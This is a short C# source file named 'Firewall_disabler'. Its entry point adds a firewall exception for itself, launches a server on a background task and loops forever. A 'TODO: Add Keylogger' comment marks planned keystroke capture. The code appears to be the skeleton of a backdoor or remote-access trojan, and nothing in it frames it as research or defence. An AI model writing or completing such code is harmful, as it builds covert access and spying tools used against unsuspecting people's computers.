using NetFwTypeLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Firewall_disabler
{
    static class Program
    {

        static bool isRunning = true;

        [STAThread]
        static void Main()
        {
            //TODO: Add Keylogger
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            ServerSetup server = new ServerSetup();
            FirewallConfigurator firewall = new FirewallConfigurator();

            firewall.AllowProgramInFirewall(true);
            Task.Run(() => 
            {
                server.StartServer();
            });
            while (isRunning); //Keep running forever

            //AllowProgram(false);--> Remove program exception from firewall again
        }

 
    }
}
